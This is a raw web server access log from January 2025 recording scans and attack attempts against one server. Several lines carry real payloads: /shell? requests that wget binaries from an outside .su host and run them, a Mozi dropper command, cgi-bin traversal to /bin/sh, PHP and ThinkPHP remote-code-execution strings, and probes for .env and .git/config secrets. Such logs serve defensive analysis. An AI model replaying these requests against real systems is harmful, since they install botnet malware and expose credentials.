185.180.140.107 - - [15/Jan/2025:04:18:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:04:47:11 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.0"
78.153.140.151 - - [15/Jan/2025:04:47:12 +0000] "GET /whturk/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0"
18.163.14.203 - - [15/Jan/2025:04:53:02 +0000] "\x16\x03\x01" 400 533 "-" "-"
18.163.14.203 - - [15/Jan/2025:04:53:42 +0000] "HEAD /actuator/env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:05:03:10 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
83.222.191.146 - - [15/Jan/2025:05:05:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [15/Jan/2025:05:11:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
15.235.189.145 - - [15/Jan/2025:05:23:30 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
141.98.11.119 - - [15/Jan/2025:05:32:21 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
139.99.35.32 - - [15/Jan/2025:05:33:53 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
65.49.1.104 - - [15/Jan/2025:05:51:31 +0000] "\x16\x03\x01" 400 533 "-" "-"
178.215.236.132 - - [15/Jan/2025:06:08:14 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/3.01Gold (Win95; I)"
5.181.190.248 - - [15/Jan/2025:06:13:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:06:13:53 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
62.84.100.218 - - [15/Jan/2025:06:14:59 +0000] "GET /env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
62.84.100.218 - - [15/Jan/2025:06:15:00 +0000] "GET /actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:06:15:02 +0000] "GET /admin/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
62.84.100.218 - - [15/Jan/2025:06:15:06 +0000] "GET /api/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.15"
62.84.100.218 - - [15/Jan/2025:06:15:10 +0000] "GET /admin/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1"
62.84.100.218 - - [15/Jan/2025:06:15:10 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.2.22"
62.84.100.218 - - [15/Jan/2025:06:15:24 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.2.22"
87.120.125.13 - - [15/Jan/2025:06:15:41 +0000] "POST /cgi-bin/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/bin/sh HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
87.120.125.13 - - [15/Jan/2025:06:15:41 +0000] "GET / HTTP/1.1" 200 947 "http://34.176.179.0/cgi-bin/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/%32%65%32%65/bin/sh" "Go-http-client/1.1"
175.202.4.111 - - [15/Jan/2025:06:16:50 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
172.169.6.6 - - [15/Jan/2025:06:19:15 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
141.98.11.119 - - [15/Jan/2025:06:25:05 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
64.23.201.216 - - [15/Jan/2025:06:45:47 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
31.130.127.6 - - [15/Jan/2025:07:06:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:08:09:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [15/Jan/2025:08:12:47 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:08:12:47 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
45.156.129.135 - - [15/Jan/2025:08:14:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
58.11.45.238 - - [15/Jan/2025:08:26:48 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
179.43.191.146 - - [15/Jan/2025:08:31:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
147.185.133.219 - - [15/Jan/2025:08:46:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
182.237.203.194 - - [15/Jan/2025:09:14:26 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
147.185.132.162 - - [15/Jan/2025:09:52:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.181.190.248 - - [15/Jan/2025:10:58:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:10:58:26 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
122.116.81.92 - - [15/Jan/2025:11:07:46 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
138.197.154.130 - - [15/Jan/2025:11:42:41 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
80.82.77.202 - - [15/Jan/2025:11:51:01 +0000] "\x16\x03\x02\x01o\x01" 400 533 "-" "-"
172.206.139.15 - - [15/Jan/2025:11:52:33 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
64.23.201.216 - - [15/Jan/2025:11:55:56 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
31.43.185.66 - - [15/Jan/2025:12:46:32 +0000] "\x16\x03\x01\x05\xa8\x01" 400 533 "-" "-"
185.196.220.16 - - [15/Jan/2025:12:53:15 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2)"
80.82.77.202 - - [15/Jan/2025:12:59:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
66.240.223.202 - - [15/Jan/2025:13:11:36 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
59.28.2.247 - - [15/Jan/2025:13:39:19 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
139.59.101.104 - - [15/Jan/2025:13:41:11 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
5.181.190.248 - - [15/Jan/2025:14:05:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:14:05:30 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
179.43.191.146 - - [15/Jan/2025:14:11:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
114.32.176.167 - - [15/Jan/2025:14:11:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
64.62.197.105 - - [15/Jan/2025:14:18:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
47.47.12.146 - - [15/Jan/2025:14:20:13 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
64.62.197.104 - - [15/Jan/2025:14:20:38 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4951.41 Safari/537.36"
64.62.197.96 - - [15/Jan/2025:14:21:12 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:15:01:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.215.236.132 - - [15/Jan/2025:15:53:45 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/75.0.3770.142 Chrome/75.0.3770.142 Safari/537.36"
86.153.71.38 - - [15/Jan/2025:15:56:55 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
86.153.71.38 - - [15/Jan/2025:15:56:56 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
139.59.101.104 - - [15/Jan/2025:16:01:26 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
112.168.75.207 - - [15/Jan/2025:16:47:35 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
185.196.8.92 - - [15/Jan/2025:16:52:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
5.181.190.248 - - [15/Jan/2025:17:14:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:17:14:53 +0000] "GET / HTTP/1.1" 200 1742 "http://34.176.179.0:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
18.216.4.246 - - [15/Jan/2025:17:18:33 +0000] "\x16\x03\x01" 400 533 "-" "-"
18.216.4.246 - - [15/Jan/2025:17:18:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
80.82.77.202 - - [15/Jan/2025:17:20:12 +0000] "\x16\x03\x02\x01o\x01" 400 533 "-" "-"
59.93.28.232 - - [15/Jan/2025:17:57:21 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 533 "-" "-"
135.148.8.101 - - [15/Jan/2025:18:02:13 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
15.204.37.91 - - [15/Jan/2025:18:09:05 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
45.156.129.133 - - [15/Jan/2025:18:11:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.91.174.247 - - [15/Jan/2025:18:16:20 +0000] "\x16\x03\x03\x01\xa5\x01" 400 533 "-" "-"
51.91.174.249 - - [15/Jan/2025:18:16:24 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
75.119.154.236 - - [15/Jan/2025:18:18:46 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:46 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 486 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:47 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:47 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:48 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:48 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:48 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:48 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:49 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:49 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:49 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:50 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:50 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:50 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:51 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:51 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:51 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:52 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:52 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:52 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:53 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:54 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:54 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:54 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:55 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:56 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:56 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:57 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:57 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:58 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:18:59 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:00 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:00 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:01 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:01 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:02 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:03 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:03 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:04 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:04 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:05 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:05 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:06 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:06 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
75.119.154.236 - - [15/Jan/2025:18:19:06 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
79.137.7.74 - - [15/Jan/2025:18:22:36 +0000] "\x16\x03\x03\x01\xa5\x01" 400 533 "-" "-"
79.137.7.71 - - [15/Jan/2025:18:22:37 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
61.77.195.81 - - [15/Jan/2025:19:38:40 +0000] "GET / HTTP/1.0" 400 533 "-" "curl/7.88.1"
64.23.201.216 - - [15/Jan/2025:19:48:47 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
78.153.140.203 - - [15/Jan/2025:19:50:39 +0000] "\x16\x03\x01" 400 533 "-" "-"
78.153.140.203 - - [15/Jan/2025:19:50:39 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MS-RTC LM 8)"
78.153.140.203 - - [15/Jan/2025:19:50:40 +0000] "GET /Demo/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5"
78.153.140.203 - - [15/Jan/2025:19:50:42 +0000] "GET /DEMO/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.3; NokiaX2DS Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Mobile Safari/537.36 OPR/22.0.1485.80265"
78.153.140.203 - - [15/Jan/2025:19:50:42 +0000] "GET /Dev/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; CMDTDFJS; F9J)"
78.153.140.203 - - [15/Jan/2025:19:50:43 +0000] "GET /DEV/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) demobrowser/0.1 Safari/538.1"
78.153.140.203 - - [15/Jan/2025:19:50:50 +0000] "GET /Doc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092809 Gentoo Firefox/3.0.2"
78.153.140.203 - - [15/Jan/2025:19:51:01 +0000] "GET /DOC/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-ca; SGH-I317M Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [15/Jan/2025:19:51:06 +0000] "GET /Docs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [15/Jan/2025:19:51:08 +0000] "GET /DOCS/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.4; Lenovo A6000 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36"
78.153.140.203 - - [15/Jan/2025:19:51:10 +0000] "GET /Download/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SAMSUNG-SGH-I747 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [15/Jan/2025:19:51:13 +0000] "GET /Env/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; da-DK) AppleWebKit/523.12.9 (KHTML, like Gecko) Version/3.0 Safari/523.12.9"
78.153.140.203 - - [15/Jan/2025:19:51:18 +0000] "GET /Html/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.9.2.15) Gecko/20110303 Ubuntu/8.04 (hardy) Firefox/3.6.15"
